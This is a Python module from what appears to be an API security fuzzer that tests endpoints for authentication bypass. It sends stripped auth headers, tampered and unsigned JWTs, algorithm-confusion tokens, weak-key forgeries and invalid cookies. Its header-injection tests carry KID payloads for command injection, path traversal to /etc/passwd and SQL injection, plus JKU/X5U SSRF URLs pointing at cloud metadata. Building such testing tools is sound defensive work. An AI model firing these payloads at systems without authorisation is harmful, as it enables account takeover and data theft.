import copy
import jwt
import time
from testing_modules.base_module import FuzzingModule, FuzzingResult
from core.colors import colored_print, format_log_prefix

class AuthenticationModule(FuzzingModule):
    key = "authentication"

    def run(self, parsed_request: dict, step_config: dict, **kwargs) -> list[FuzzingResult]:
        """
        Comprehensive authentication testing for endpoints:
        - No authentication (no JWT/cookie)
        - Invalid JWT (malformed, expired, tampered)
        - Algorithm confusion attacks (RS256/HS256)
        - Invalid cookie
        - JWT with different keys
        - JWT with modified claims
        """
        results = []
        base_state = copy.deepcopy(self.state_manager)
        set_headers = step_config.get('set_headers', {}) or {}
        
        # 1. No authentication
        results.extend(self._test_no_auth(parsed_request, base_state, set_headers))
        
        # 2. Invalid JWT tests
        if 'Authorization' in set_headers or 'authorization' in set_headers:
            results.extend(self._test_invalid_jwt(parsed_request, base_state, set_headers))
            results.extend(self._test_jwt_algorithm_confusion(parsed_request, base_state, set_headers))
            results.extend(self._test_jwt_header_injection(parsed_request, base_state, set_headers))
            results.extend(self._test_jwt_structure(parsed_request, base_state, set_headers))
            # results.extend(self._test_jwt_tampering(parsed_request, base_state, set_headers))
            # results.extend(self._test_jwt_expired(parsed_request, base_state, set_headers))
        
        # 3. Invalid Cookie
        if 'Cookie' in set_headers or 'cookie' in set_headers:
            results.extend(self._test_invalid_cookie(parsed_request, base_state, set_headers))
        
        return results

    def _test_no_auth(self, parsed_request, base_state, set_headers):
        """
        Test access without authentication and with empty/malformed auth headers.
        """
        results = []
        
        # 1. Completely remove auth headers
        no_auth_headers = {k: v for k, v in set_headers.items() if (k.lower() != 'authorization' and k.lower() != 'cookie')}
        
        # List of header configurations to test
        test_configs = [
            (no_auth_headers, "No Auth Headers"),
            ({**no_auth_headers, "Authorization": ""}, "Empty Authorization Header"),
            ({**no_auth_headers, "Authorization": "Bearer"}, "Empty Bearer Token"),
            ({**no_auth_headers, "Authorization": "Bearer "}, "Empty Bearer Token (Space)"),
            ({**no_auth_headers, "Authorization": "Basic"}, "Empty Basic Token"),
        ]

        for headers, desc in test_configs:
            final_request = self.runner.prepare_request(parsed_request, base_state, headers)
            try:
                response = self.runner.run(final_request)
                if 200 <= response.status_code < 300:
                    result = self.create_enhanced_result(
                        is_vulnerable=True,
                        description=f"Endpoint accessible with {desc}",
                        request=final_request,
                        response=response,
                        payload=desc,
                        step_name="no_auth",
                        expected_vulnerable=True
                    )
                    result = self.enhance_result_with_baseline(result)
                    results.append(result)
                else:
                    result = self.create_enhanced_result(
                        is_vulnerable=False,
                        description=f"Access denied with {desc} (expected).",
                        request=final_request,
                        response=response,
                        payload=desc,
                        step_name="no_auth",
                        expected_vulnerable=False
                    )
                    result = self.enhance_result_with_baseline(result)
                    results.append(result)
            except Exception as e:
                colored_print(f"Auth test (no auth) failed: {e}", "error")
        return results

    def _test_invalid_jwt(self, parsed_request, base_state, set_headers):
        """
        Orchestrator for JWT fuzzing tests.
        Refactored to split responsibilities into smaller methods.
        """
        results = []
        
        # 1. Load Payloads
        fuzz_payloads = self.payload_manager.get_payloads('jwt_fuzz_payloads')
        if not fuzz_payloads:
            fuzz_payloads = [
                "NaN", "undefined", "true", "false", "TRUE", "FALSE", "", " ", "null", "NULL", "Null", 
                "0", "1", "-1", "999999999", "-999999999", "0.0", "1.0", "-1.0", "0/1", "0", "1", "-1",
                "9*9", "2147483647", "1+1", "1-9" "-2147483647", "00000000-0000-0000-0000-00000, 0000000",
                "admin", "root", "superuser", "administrator", "none", "None", "NONE", "(xxxxxxxxxx)"
                "${7*7}", "${1?lower_abc}", "${27?lower_abc}", "#{3*3}", "#{ 7 * 7 }",
                "{{4*4}}[[5*5]]", "{{7*7}}", "{{7*'7'}}", "<%= 7 * 7 %>", "${3*3}", "${{7*7}}", "@(1+2)",
                "{}", "[]", "\"\"", "''", "`", "~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")","*"
                # "javascript:alert(1)", "<script>alert(1)</script>",
                # "OR 1=1", "OR 1=1--", "OR 1=1#", "OR 1=1/*",
                # "UNION SELECT", "UNION ALL SELECT", "SELECT * FROM",
                # "eval(", "exec(", "system(", "shell_exec(",
                # "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
                # "file:///etc/passwd", "file:///c:/windows/system32/config/sam",
                "\\u0000", "\\u0001", "\\u0002", "\\u0003", "\\u0004", "\\u0005", "\\u0006", "\\u0007", 
                "\\u0008", "\\u0009", "\\u000a", "\\u000b", "\\u000c", "\\u000d", "\\u000e", "\\u000f",
                "\\u0010", "\\u0011", "\\u0012", "\\u0013", "\\u0014", "\\u0015", "\\u0016", "\\u0017", 
                "\\u0018", "\\u0019", "\\u001a", "\\u001b", "\\u001c", "\\u001d", "\\u001e", "\\u001f",
                "%00", "%01", "%02", "%03", "%04", "%05", "%06", "%07", 
                "%08", "%09", "%0a", "%0b", "%0c", "%0d", "%0e", "%0f",
                "%10", "%11", "%12", "%13", "%14", "%15", "%16", "%17", 
                "%18", "%19", "%1a", "%1b", "%1c", "%1d", "%1e", "%1f"
            ]

        # Filter valid/edge-case payloads
        def is_valid_header_value(payload):
            if not payload or payload.strip() == "": return False
            for char in payload:
                if ord(char) < 32 or ord(char) > 126: return False
            return True

        valid_payloads = [p for p in fuzz_payloads if is_valid_header_value(p)]
        edge_case_payloads = [p for p in fuzz_payloads if not is_valid_header_value(p)]
        
        if not valid_payloads:
            valid_payloads = ["0", "1", "null", "admin", "test"]

        colored_print(f"  -> Using {len(valid_payloads)} valid payloads and {len(edge_case_payloads)} edge case payloads", "info")

        # 2. Execute Sub-tests
        results.extend(self._fuzz_jwt_signature(parsed_request, base_state, set_headers, valid_payloads, edge_case_payloads))
        results.extend(self._fuzz_jwt_payload_fields(parsed_request, base_state, set_headers, valid_payloads))
        results.extend(self._fuzz_entire_jwt(parsed_request, base_state, set_headers, valid_payloads, edge_case_payloads))
        
        return results

    def _fuzz_jwt_signature(self, parsed_request, base_state, set_headers, valid_payloads, edge_case_payloads):
        """Fuzz only the signature part of the JWT."""
        results = []
        original_auth_header = set_headers.get('Authorization', '')
        resolved_auth_header = base_state.substitute(original_auth_header)
        original_token = resolved_auth_header.replace('Bearer ', '').replace('Basic ', '').strip()
        auth_formats = ['Bearer', 'Basic', 'Authorization']

        if not original_token or '.' not in original_token:
            return results

        parts = original_token.split('.')
        if len(parts) < 2:
            return results
            
        original_header = parts[0]
        original_payload = parts[1]
        
        colored_print("  -> Testing JWT signature fuzzing...", "info")
        
        # Helper for common logic
        def run_fuzz(payload, is_raw=False):
            fuzzed_token = f"{original_header}.{original_payload}.{payload}"
            return self._run_jwt_test(
                parsed_request, base_state, set_headers, fuzzed_token, auth_formats, 
                f"Signature fuzz ({'Raw' if is_raw else 'Std'})", is_raw=is_raw, raw_payload=payload
            )

        for payload in valid_payloads:
            results.extend(run_fuzz(payload, is_raw=False))

        colored_print("  -> Testing JWT signature edge cases with raw HTTP...", "info")
        for payload in edge_case_payloads:
            results.extend(run_fuzz(payload, is_raw=True))
            
        return results

    def _fuzz_jwt_payload_fields(self, parsed_request, base_state, set_headers, valid_payloads):
        """Decode JWT payload, fuzz specific fields, and reconstruct."""
        results = []
        original_auth_header = set_headers.get('Authorization', '')
        resolved_auth_header = base_state.substitute(original_auth_header)
        original_token = resolved_auth_header.replace('Bearer ', '').replace('Basic ', '').strip()
        auth_formats = ['Bearer', 'Basic', 'Authorization']

        if not original_token or '.' not in original_token:
            return results

        parts = original_token.split('.')
        if len(parts) < 2: return results
        
        original_header = parts[0]
        original_payload_enc = parts[1]
        original_signature = parts[2] if len(parts) > 2 else ""

        try:
            import base64, json
            padding = '=' * (-len(original_payload_enc) % 4)
            decoded_payload = base64.urlsafe_b64decode(original_payload_enc + padding)
            payload_data = json.loads(decoded_payload.decode('utf-8'))
        except Exception as e:
            colored_print(f"JWT payload decoding failed: {e}", "error")
            return results
            
        test_fields = [f for f in ['user_id', 'role', 'sub', 'id', 'uid'] if f in payload_data]
        if not test_fields and payload_data:
            test_fields = [list(payload_data.keys())[0]]
            
        if not test_fields:
            return results

        test_field = test_fields[0]
        original_value = payload_data[test_field]
        colored_print(f"  -> Testing JWT signature validation by modifying field: {test_field}", "info")
        
        # Subset of payloads for field fuzzing
        field_payloads = ["admin", "999999", "0", "null", "true"]
        
        for payload in field_payloads:
            try:
                fuzzed_data = payload_data.copy()
                fuzzed_data[test_field] = payload
                
                fuzzed_json = json.dumps(fuzzed_data, separators=(',', ':'))
                fuzzed_enc = base64.urlsafe_b64encode(fuzzed_json.encode('utf-8')).decode('utf-8').rstrip('=')
                
                # Reconstruct with ORIGINAL signature to test signature validation
                fuzzed_token = f"{original_header}.{fuzzed_enc}.{original_signature}"
                
                res_list = self._run_jwt_test(
                    parsed_request, base_state, set_headers, fuzzed_token, auth_formats,
                    f"JWT payload tampering ({test_field}={payload})"
                )
                
                # Check results - if no results (meaning 4xx/5xx), it means sig validation worked (good)
                if not res_list:
                     colored_print(f"  -> JWT signature validation working - rejected {test_field}={payload}", "success")
                results.extend(res_list)
                
            except Exception as e:
                colored_print(f"JWT payload fuzz prep failed: {e}", "error")
                
        return results

    def _fuzz_entire_jwt(self, parsed_request, base_state, set_headers, valid_payloads, edge_case_payloads):
        """Replace the ENTIRE token with fuzz payloads."""
        results = []
        auth_formats = ['Bearer', 'Basic', 'Authorization']
        
        colored_print("  -> Testing entire JWT fuzzing...", "info")
        
        for payload in valid_payloads:
             results.extend(self._run_jwt_test(
                parsed_request, base_state, set_headers, payload, auth_formats,
                f"Entire JWT fuzz: {payload}", is_raw=False
            ))
            
        colored_print("  -> Testing entire JWT edge cases with raw HTTP...", "info")
        for payload in edge_case_payloads:
            results.extend(self._run_jwt_test(
                parsed_request, base_state, set_headers, payload, auth_formats,
                f"Entire JWT fuzz edge case", is_raw=True, raw_payload=payload
            ))
            
        return results

    def _run_jwt_test(self, parsed_request, base_state, set_headers, token_value, auth_formats, desc_suffix, is_raw=False, raw_payload=None):
        """Common runner for JWT tests."""
        results = []
        for auth_format in auth_formats:
            try:
                # Construct header value
                if auth_format == 'Bearer':
                    auth_val = f'Bearer {token_value}'
                elif auth_format == 'Basic':
                    auth_val = f'Basic {token_value}'
                else:
                    auth_val = token_value

                test_headers = dict(set_headers)
                test_headers['Authorization'] = auth_val
                
                if is_raw and raw_payload:
                     # Use the raw HTTP helper
                     # Note: The raw helper logic from original code needs to be accessible
                     # We'll use a simplified version here or assume self.test_with_raw_http exists
                     # For the sake of refactoring, I'll inline the logic or assume a helper method.
                     # Since I cannot move the inner function easily, I will implement a class-level helper.
                     res = self._test_with_raw_http_helper(parsed_request, test_headers, token_value, raw_payload, auth_format, desc_suffix)
                     if res: results.append(res)
                else:
                    final_request = self.runner.prepare_request(parsed_request, base_state, test_headers)
                    response = self.runner.run(final_request)
                    if 200 <= response.status_code < 300:
                        results.append(FuzzingResult(
                            is_vulnerable=True,
                            description=f"Success: {desc_suffix} with {auth_format}",
                            request=final_request,
                            response_status=response.status_code,
                            response_size=len(response.content),
                            payload=f"{desc_suffix} ({auth_format})"
                        ))
            except Exception as e:
                # validation errors are expected for fuzzing
                pass
        return results

    def _test_with_raw_http_helper(self, parsed_request, headers, full_auth_value, raw_payload, auth_format, test_type):
        """Class-level helper for raw HTTP requests."""
        try:
            import socket, urllib.parse
            url = parsed_request.get('url', '')
            parsed_url = urllib.parse.urlparse(url)
            method = parsed_request.get('method', 'GET')
            path = parsed_url.path
            if parsed_url.query: path += '?' + parsed_url.query
            
            http_headers = [f"{k}: {v}" for k, v in headers.items() if k.lower() != 'authorization']
            http_headers.append(f"Authorization: {full_auth_value}") # Header already formatted in caller
            
            request_lines = [f"{method} {path} HTTP/1.1", f"Host: {parsed_url.netloc}", *http_headers, "", ""]
            request_data = "\r\n".join(request_lines).encode('utf-8')
            
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((parsed_url.hostname, port))
            sock.send(request_data)
            response_data = sock.recv(4096)
            sock.close()
            
            status_line = response_data.decode('utf-8', errors='ignore').split('\r\n')[0]
            status_code = int(status_line.split(' ')[1])
            
            if 200 <= status_code < 300:
                return FuzzingResult(
                    is_vulnerable=True,
                    description=f"Raw HTTP Success: {test_type}",
                    request={"method": method, "url": url, "headers": headers},
                    response_status=status_code,
                    response_size=len(response_data),
                    payload=f"Raw: {raw_payload}"
                )
        except Exception:
            pass
        return None

    def _test_jwt_header_injection(self, parsed_request, base_state, set_headers):
        """Test for Header Injection (KID/JKU) attacks."""
        results = []
        original_auth = set_headers.get('Authorization', '')
        resolved_auth = base_state.substitute(original_auth)
        token = resolved_auth.replace('Bearer ', '').replace('Basic ', '').strip()
        
        if not token or '.' not in token: return results
        
        parts = token.split('.')
        if len(parts) < 2: return results
        
        # We need the original payload and current signature (to maintain validity structure as much as possible)
        # But usually we sign these ourselves if we want them valid, or we just inject into header and see.
        # Here we just inject into header and keep original signature (or empty), hoping specifically for 
        # header processing vulnerabilities before signature verification.
        
        import base64, json
        
        # KID Injection Payloads (SQLi, Command Injection, Directory Traversal)
        kid_payloads = [
            "' OR '1'='1", "\"; ls #", "../../../../../etc/passwd", "file:///etc/passwd",
            "nonexistent_key_id", "1UNION SELECT 1,2,3--"
        ]
        
        # JKU/X5U Injection Payloads (SSRF)
        jku_payloads = [
            "http://127.0.0.1:80", "http://localhost:8080", 
            "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"
        ]
        
        header_part = parts[0]
        payload_part = parts[1]
        sig_part = parts[2] if len(parts) > 2 else ""
        
        try:
            padding = '=' * (-len(header_part) % 4)
            header_json = base64.urlsafe_b64decode(header_part + padding).decode('utf-8')
            header_data = json.loads(header_json)
        except:
            return results
            
        # Helper to run test
        def run_header_test(mod_header_data, payload_desc):
            try:
                new_header_json = json.dumps(mod_header_data, separators=(',', ':'))
                new_header_enc = base64.urlsafe_b64encode(new_header_json.encode('utf-8')).decode('utf-8').rstrip('=')
                # Keep original signature
                new_token = f"{new_header_enc}.{payload_part}.{sig_part}"
                
                # Test with Bearer
                test_headers = dict(set_headers)
                test_headers['Authorization'] = f"Bearer {new_token}"
                
                req = self.runner.prepare_request(parsed_request, base_state, test_headers)
                resp = self.runner.run(req)
                
                if 200 <= resp.status_code < 300:
                    results.append(FuzzingResult(
                        is_vulnerable=True,
                        description=f"Possible JWT Header Injection Vulnerability: {payload_desc}",
                        request=req,
                        response_status=resp.status_code,
                        response_size=len(resp.content),
                        payload=payload_desc
                    ))
            except: pass

        # Test KID
        colored_print("  -> Testing JWT KID injection...", "info")
        for kid in kid_payloads:
            mod_head = header_data.copy()
            mod_head['kid'] = kid
            run_header_test(mod_head, f"KID Injection: {kid}")
            
        # Test JKU
        colored_print("  -> Testing JWT JKU/X5U injection...", "info")
        for url in jku_payloads:
            mod_head = header_data.copy()
            mod_head['jku'] = url
            run_header_test(mod_head, f"JKU Injection: {url}")
            
            mod_head = header_data.copy()
            mod_head['x5u'] = url
            run_header_test(mod_head, f"X5U Injection: {url}")
            
        return results

    def _test_jwt_structure(self, parsed_request, base_state, set_headers):
        """Test malformed JWT structures."""
        results = []
        original_auth = set_headers.get('Authorization', '')
        resolved_auth = base_state.substitute(original_auth)
        token = resolved_auth.replace('Bearer ', '').replace('Basic ', '').strip()
        
        if not token or '.' not in token: return results
        
        parts = token.split('.')
        header = parts[0]
        payload = parts[1] if len(parts) > 1 else ""
        
        # 1. No Signature (header.payload.) - Trailing dot
        # Known to bypass some poor regex validations
        structures = [
            (f"{header}.{payload}.", "Trailing Dot (No Sig)"),
            (f"{header}.{payload}", "No Signature Part"),
            (f"{header}.", "Header Only + Dot"),
            (f".{payload}.{parts[2] if len(parts)>2 else ''}", "Empty Header"),
            (f"{header}..{parts[2] if len(parts)>2 else ''}", "Empty Payload")
        ]
        
        colored_print("  -> Testing JWT structure mutations...", "info")
        for token_val, desc in structures:
            try:
                test_headers = dict(set_headers)
                test_headers['Authorization'] = f"Bearer {token_val}"
                
                req = self.runner.prepare_request(parsed_request, base_state, test_headers)
                resp = self.runner.run(req)
                
                if 200 <= resp.status_code < 300:
                    results.append(FuzzingResult(
                        is_vulnerable=True,
                        description=f"JWT Structure Vulnerability: {desc}",
                        request=req,
                        response_status=resp.status_code,
                        response_size=len(resp.content),
                        payload=desc
                    ))
            except: pass
            
        return results

    def _test_jwt_algorithm_confusion(self, parsed_request, base_state, set_headers):
        """Test JWT algorithm confusion attacks (RS256/HS256)."""
        results = []
        
        auth_formats = ['Bearer', 'Basic', '']

        # Get original token for reference
        original_auth_header = set_headers.get('Authorization', '')
        # Resolve template variables in the header
        resolved_auth_header = base_state.substitute(original_auth_header)
        original_token = resolved_auth_header.replace('Bearer ', '').replace('Basic ', '')

        if original_token and '.' in original_token:
            parts = original_token.split('.')
            if len(parts) >= 2:
                original_header = parts[0]
                original_payload = parts[1]
                original_signature = parts[2] if len(parts) > 2 else ""
                # Decode the original header to preserve all fields
                import base64, json
                padding = '=' * (-len(original_header) % 4)
                original_header_json = base64.urlsafe_b64decode(original_header + padding).decode('utf-8')
                original_header_dict = json.loads(original_header_json)
        
        # Load public keys from payloads for algorithm confusion
        public_keys = self.payload_manager.get_payloads('jwt_public_keys')
        if not public_keys:
            # Fallback to common public key
            public_keys = ["""-----BEGIN PUBLIC KEY-----
                        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo
                        4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7SDkuj4hLx4oR3c
                        p0Waq3gdMB3GRjf1VnNUqQxH+CgRHPu88ah5yqS/oY4GLcmU1RCp/uVoD8wTWa4
                        XnfYisOqBpnGPgrD2OvwbRDoILsq98Oa2BfKbl6KUpTfDp573Xj2zWSgSVOMKv
                        Vk6JnHmIByx5u/ImzgjCqC3wpyAOPkMBFpUtE9SviwSe7WHWcv4o26IuR1Bzz6
                        XWzR2LcJU8lqDcU+JN4u3yMp6O7cS5DbY1WLiy6S0zUlD+ZqpkFMLHqR0CgQw
                        AQIDAQAB
                        -----END PUBLIC KEY-----"""]
        
        # Test 1: Try to use HS256 with public keys from payloads
        for public_key in public_keys:
            try:
                # Try to create a token signed with HS256 using the public key as secret
                token = jwt.encode(original_payload, public_key, algorithm='HS256', headers=original_header_dict)
                confusion_headers = dict(set_headers)
                for auth_format in auth_formats:
                    confusion_headers['Authorization'] = f'{auth_format} {token}'
                    final_request = self.runner.prepare_request(parsed_request, base_state, confusion_headers)
                    
                    response = self.runner.run(final_request)
                    if 200 <= response.status_code < 300:
                        results.append(FuzzingResult(
                            is_vulnerable=True,
                            description="JWT Algorithm Confusion Attack Successful! (HS256 with public key)",
                            request=final_request,
                            response_status=response.status_code,
                            response_size=len(response.content),
                            payload=f"Algorithm Confusion: {auth_format} HS256 with public key"
                        ))
            except Exception as e:
                colored_print(f"JWT algorithm confusion test failed: {e}", "error")
        
        # Test 2: Try with 'none' algorithm
        try:
            for alg in ['none', 'None', 'NONE', "nOnE"]:
                token = jwt.encode(original_payload, '', algorithm=alg, headers=original_header_dict)
                none_headers = dict(set_headers)
                for auth_format in auth_formats:
                    none_headers['Authorization'] = f'{auth_format} {token}'
                    final_request = self.runner.prepare_request(parsed_request, base_state, none_headers)
                
                    response = self.runner.run(final_request)
                    if 200 <= response.status_code < 300:
                        results.append(FuzzingResult(
                            is_vulnerable=True,
                            description=f"{auth_format} - JWT '{alg}' Algorithm Attack Successful!",
                            request=final_request,
                            response_status=response.status_code,
                            response_size=len(response.content),
                            payload=f"Algorithm: {auth_format} - {alg}"
                        ))
        except Exception as e:
            colored_print(f"JWT none algorithm test failed: {e}", "error")
        
        return results

    def _test_jwt_tampering(self, parsed_request, base_state, set_headers):
        """Test JWT token tampering attacks."""
        results = []
        
        # Get the original token from headers
        original_token = set_headers.get('Authorization', '').replace('Bearer ', '')
        if not original_token:
            return results
        
        try:
            # Decode the token without verification to get payload
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
            # Tamper with the payload
            tampered_payload = payload.copy()
            tampered_payload['user_id'] = 201  # Change to admin user
            tampered_payload['role'] = 'admin'
            
            # Load weak keys from payloads
            weak_keys = self.payload_manager.get_payloads('jwt_weak_keys')
            if not weak_keys:
                # Fallback to common weak keys
                weak_keys = ["weak_secret_key_123", "secret", "password", "admin"]
            
            for weak_key in weak_keys:
                try:
                    tampered_token = jwt.encode(tampered_payload, weak_key, algorithm='HS256')
                    
                    tampered_headers = dict(set_headers)
                    tampered_headers['Authorization'] = f'Bearer {tampered_token}'
                    final_request = self.runner.prepare_request(parsed_request, base_state, tampered_headers)
                    
                    response = self.runner.run(final_request)
                    if 200 <= response.status_code < 300:
                        results.append(FuzzingResult(
                            is_vulnerable=True,
                            description="JWT Tampering Attack Successful! (Modified user_id and role)",
                            request=final_request,
                            response_status=response.status_code,
                            response_size=len(response.content),
                            payload=f"Tampered JWT with weak key: {weak_key}"
                        ))
                except Exception as e:
                    colored_print(f"JWT tampering test failed: {e}", "error")
        except Exception as e:
            colored_print(f"JWT tampering test failed: {e}", "error")
        
        return results

    def _test_jwt_expired(self, parsed_request, base_state, set_headers):
        """Test with expired JWT tokens."""
        results = []
        
        # Create an expired token
        expired_payload = {
            "user_id": 101,
            "role": "user",
            "exp": int(time.time()) - 3600,  # Expired 1 hour ago
            "iat": int(time.time()) - 7200
        }
        
        # Load weak keys from payloads
        weak_keys = self.payload_manager.get_payloads('jwt_weak_keys')
        if not weak_keys:
            # Fallback to common weak keys
            weak_keys = ["weak_secret_key_123", "secret", "password", "admin"]
        
        for weak_key in weak_keys:
            try:
                expired_token = jwt.encode(expired_payload, weak_key, algorithm='HS256')
                
                expired_headers = dict(set_headers)
                expired_headers['Authorization'] = f'Bearer {expired_token}'
                final_request = self.runner.prepare_request(parsed_request, base_state, expired_headers)
                
                response = self.runner.run(final_request)
                if 200 <= response.status_code < 300:
                    results.append(FuzzingResult(
                        is_vulnerable=True,
                        description="Endpoint accessible with expired JWT!",
                        request=final_request,
                        response_status=response.status_code,
                        response_size=len(response.content),
                        payload=f"Expired JWT with weak key: {weak_key}"
                    ))
            except Exception as e:
                colored_print(f"JWT expired test failed: {e}", "error")
        
        return results

    def _test_invalid_cookie(self, parsed_request, base_state, set_headers):
        """Test with invalid session cookies loaded from payloads."""
        results = []
        
        # Load invalid cookies from payloads
        invalid_cookies = self.payload_manager.get_payloads('invalid_cookies')
        if not invalid_cookies:
            # Fallback to basic invalid cookies if file doesn't exist
            invalid_cookies = [
                "INVALIDCOOKIE123",
                "session=invalid",
                "session=",
                "invalid_session=123",
                ""
            ]
        
        for cookie in invalid_cookies:
            invalid_cookie_headers = dict(set_headers)
            invalid_cookie_headers['Cookie'] = cookie
            final_request = self.runner.prepare_request(parsed_request, base_state, invalid_cookie_headers)
            try:
                response = self.runner.run(final_request)
                if 200 <= response.status_code < 300:
                    results.append(FuzzingResult(
                        is_vulnerable=True,
                        description=f"Endpoint accessible with invalid session cookie: {cookie}",
                        request=final_request,
                        response_status=response.status_code,
                        response_size=len(response.content),
                        payload=f"Invalid Cookie: {cookie}"
                    ))
            except Exception as e:
                colored_print(f"Auth test (invalid cookie) failed: {e}", "error")
        return results 